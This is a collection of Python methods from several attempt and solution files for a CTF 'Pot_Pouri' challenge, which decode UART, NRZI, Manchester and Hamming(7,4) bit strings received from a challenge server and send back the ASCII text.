        # text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        # decoded = self.decode_hamming74(text)

        # #

        # text = "001101010010100001101100011011001"
        # text = "01110110011"
        # start = time.time()
        # # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        # test = "0110001100101110111001011101110010110001100100000101001"
        # decoded = self.decode_uart(text)

        # print(f"time: {time.time() - start} - Decoded: {decoded}")
        # # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_nrzi(self, signal: str, verbose=False) -> str:
        """
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., "110110...").
        Returns the original bit string (e.g., "0100...").
        """
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f"Signal levels:   {levels}")
            print(f"Decoded bits:    {decoded_bits}")

        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        if verbose:
            print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        if verbose:
            print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def main(self):

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round(verbose=True)
            except Exception as e:
                print(f"Error in round {i}: {e}")
                break

        self.recv_lines(3, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f"Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}"
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f"Rest of bits: {rest_of_bits}")

        return valid_bits + rest_of_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater(self, bits: list, verbose=False):
        # print(bits)
        padding_length = len(bits) % 8
        if padding_length == 0:
            return bits

        padding_length = 8 - (len(bits) % 8)
        print(f"bits: {bits}")
        bits = [0] * padding_length + bits
        # bits += [0] * padding_length
        print(f"bits: {bits}")

        return bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_to_ascii(self, bits):
        grouped_bits = [bits[i : i + 8] for i in range(0, len(bits), 8)]
        ascii_chars = []
        for group in grouped_bits:
            value = int("".join(map(str, group)), 2)
            ascii_chars.append(chr(value))
        return "".join(ascii_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def encode_nrzi(self, bits: str, verbose=False) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        # current_level = encoded_bits[0]
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
                # current_level ^= 1
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f"Decoded NRZI bits: {decoded_bits}")
        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        # return self.bits_to_ascii(decoded_bits)
        return self.nrzi_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_nrzi(self, signal: str, verbose=False) -> str:
        """
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., "110110...").
        Returns the original bit string (e.g., "0100...").
        """
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f"Signal levels:   {levels}")
            print(f"Decoded bits:    {decoded_bits}")

        if verbose:
            print("".join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        if verbose:
            print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def main(self):

        self.requests = []

        # text = "011101000110110001110001101100100111001110110010"
        # text = "010110111010011111011010010011100010000110001100"
        # text = "011011101110000100111001000010010011111011110000"
        # text = "001011111001100110010011100000111010010110100011"
        text = "010010000110001110110000"
        resu = "100011111011110100100000"
        resu = "011100000100001011011111"
        # text = "100010001010101000"
        # decoded_result = "110110101010101011"
        # text = "011110111011010001000110"
        # print(text)
        # decoded = self.decode_nrzi(text, True)
        # print(decoded, decoded == resu)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

        self.recv_lines(3, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "request.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "request.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/request.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def ascii_converter(self, bits):
        """
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        """
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, "0")

        ascii_str = ""
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 <= ord(char) <= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += "."  # Non-printable character placeholder
            except ValueError:
                ascii_str += "?"  # Invalid byte

        return ascii_str

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_nrz_i(self, bits: str) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        decoded_bits = []
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return decoded_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_manchester(self, bits: str) -> str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")

        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -> indices 2,4,5,6
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_uart(
        encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        decoded = self.ascii_converter(decoded)
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def main(self):

        self.requests = []

        text = "011011101110000100111001000010010011111011110000"
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = "100110010110101000011000111110011000101010"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = "001101010010100001101100011011001"
        text = "01110110011"
        start = time.time()
        # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        test = "0110001100101110111001011101110010110001100100000101001"
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f"time: {time.time() - start} - Decoded: {decoded}")
        # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def ascii_converter(self, bits: str) -> str:
        return "".join(
            chr(int(bits[i : i + 8], 2))
            for i in range(0, len(bits), 8)
            if len(bits[i : i + 8]) == 8
        )

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_nrz_i(self, bits: str) -> str:
        result = ""
        current = "0"
        for bit in bits:
            if bit == "1":
                current = "1" if current == "0" else "0"
            result += current
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_manchester(self, bits: str) -> str:
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")
        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue
            b = list(map(int, chunk))
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_uart(self, bits: str) -> str:
        # Try all possible alignments
        for offset in range(10):
            candidate = bits[offset:]
            result = ""
            for i in range(0, len(candidate), 10):
                frame = candidate[i : i + 10]
                if len(frame) != 10:
                    continue
                if frame[0] != "0" or frame[-1] != "1":
                    continue
                data_bits = frame[1:9]
                byte = int(data_bits[::-1], 2)
                result += chr(byte)

        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        print(round_text)
        round_text = round_text.decode().strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        if len(round_text) < 2:
            sys.exit(0)  # Unexpected round format or missing data
        protocol = round_text[1]
        bits = round_text[2]

        if protocol == "[UART":
            decoded = self.decode_uart(bits)
        else:
            match protocol:
                case "[NRZI":
                    raw_bits = self.decode_nrz_i(bits)
                case "[Manchester":
                    raw_bits = self.decode_manchester(bits)
                case "[Hamming74":
                    raw_bits = self.decode_hamming74(bits)
                case _:
                    raise ValueError(f"Unknown encoding type: {protocol}")
            decoded = self.ascii_converter(raw_bits)

        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def main(self):
        self.initiate_connection()
        self.recv_lines(27, display=False)

        for _ in range(100):
            self.getting_round()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter1(self, bits: str) -> str:
        # Step 2: Convert bitstream to ASCII
        ascii_text = ""
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            if len(byte) == 8:
                ascii_text += chr(int(byte, 2))
        return ascii_text

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter(self, bits):
        """
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        """
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, "0")

        ascii_str = ""
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 <= ord(char) <= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += "."  # Non-printable character placeholder
            except ValueError:
                ascii_str += "?"  # Invalid byte

        return ascii_str

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_nrz_i(self, bits: str) -> str:
        # result = ""
        # current = "0"
        # for bit in bits:
        #     if bit == "1":
        #         # toggle the signal
        #         current = "1" if current == "0" else "0"
        #     # bit == "0" means no change
        #     result += current
        # return result
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """
        if not bits:
            return ""

        decoded = []
        prev_bit = "1"  # Start with high voltage as reference

        for bit in bits:
            if bit == prev_bit:
                decoded.append("0")
            else:
                decoded.append("1")
            prev_bit = bit

        return "".join(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_manchester(self, bits: str) -> str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")

        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -> indices 2,4,5,6
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_uart(self, bits, baud_rate=9600):
        """
        Decode UART (Universal Asynchronous Receiver-Transmitter) encoded bits.
        UART uses start/stop bits and sends LSB first with no clock signal.
        Assumes 8 data bits, 1 start bit (0), 1 stop bit (1), no parity.
        """
        if len(bits) < 10 or bits[0] != "0":
            return ""  # Invalid UART frame

        char_bits = []
        # Extract the 8 data bits (bits 1-8)
        data_bits = bits[1:9]
        # UART sends LSB first, so we need to reverse
        data_bits = data_bits[::-1]
        char_int = int(data_bits, 2)

        try:
            return chr(char_int)
        except ValueError:
            return ""

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        print(round_text)
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
